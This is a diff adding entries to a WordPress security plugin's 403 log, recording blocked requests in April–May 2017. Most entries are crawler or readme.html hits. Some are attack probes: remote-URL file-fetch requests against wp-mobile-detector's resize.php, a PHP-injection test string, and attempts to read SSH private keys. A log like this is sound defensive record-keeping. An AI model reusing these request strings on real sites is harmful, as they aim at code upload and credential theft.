@@ -8056,3 +8056,4192 @@ HTTP_REFERER:
 REQUEST_URI: /robots.txt
 QUERY_STRING: 
 HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 20, 2017 - 10:28 am]
+BPS: 1.1
+WP: 4.7.3
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: April 20, 2017 - 10:28 am]
+BPS: 1.1
+WP: 4.7.3
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: April 20, 2017 - 10:28 am]
+BPS: 1.1
+WP: 4.7.3
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: April 20, 2017 - 10:29 am]
+BPS: 1.1
+WP: 4.7.3
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: April 20, 2017 - 10:29 am]
+BPS: 1.1
+WP: 4.7.3
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: April 20, 2017 - 2:39 pm]
+BPS: 1.1
+WP: 4.7.3
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 41.87.237.158
+Host Name: 41-87-237-158.atcsp.co.za
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: April 25, 2017 - 7:01 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.70
+Host Name: 46.229.168.70
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 25, 2017 - 7:02 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 26, 2017 - 4:43 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.197.168.171
+Host Name: 171.168.197.104.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: April 27, 2017 - 1:08 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.197.168.171
+Host Name: 171.168.197.104.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: April 28, 2017 - 3:00 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.98
+Host Name: 46.229.164.98
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 28, 2017 - 9:07 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 188.138.105.23
+Host Name: static-ip-188-138-105-23.inaddr.ip-pool.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/index.php?php5=print(md5(wp))
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (WordPress.com; http://support.wordpress.com/contact)
+
+[403 GET Request: April 30, 2017 - 2:24 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.75
+Host Name: 46.229.168.75
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:24 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.71
+Host Name: 46.229.168.71
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:25 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:25 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:25 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:25 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /code-samples
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:26 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.75
+Host Name: 46.229.168.75
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:26 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.70
+Host Name: 46.229.168.70
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:26 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.74
+Host Name: 46.229.168.74
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:26 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.66
+Host Name: 46.229.168.66
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: April 30, 2017 - 2:27 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.71
+Host Name: 46.229.168.71
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 1, 2017 - 8:03 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 175.138.65.218
+Host Name: 175.138.65.218
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: May 1, 2017 - 11:27 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 175.138.65.218
+Host Name: 175.138.65.218
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: May 2, 2017 - 7:45 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 209.222.77.220
+Host Name: tor-relay.redteam.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 2, 2017 - 7:45 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 209.222.77.220
+Host Name: tor-relay.redteam.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 4, 2017 - 5:55 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 171.25.193.78
+Host Name: tor-exit4-readme.dfri.se
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 4, 2017 - 5:55 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 171.25.193.78
+Host Name: tor-exit4-readme.dfri.se
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 4, 2017 - 8:21 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 4, 2017 - 9:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 173.239.230.96
+Host Name: ip-96-230-239-173.toronto.ca.northamericancoax.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 4, 2017 - 9:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 173.239.230.96
+Host Name: ip-96-230-239-173.toronto.ca.northamericancoax.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 5, 2017 - 9:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: May 5, 2017 - 9:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: May 5, 2017 - 9:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: May 5, 2017 - 9:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: May 5, 2017 - 9:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.97
+Host Name: 180.97.215.97
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: May 5, 2017 - 9:51 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.88.242.29
+Host Name: 078088242029.warszawa.vectranet.pl
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
+
+[403 GET Request: May 5, 2017 - 2:04 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.11.180.67
+Host Name: exit.norway.tor-node.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
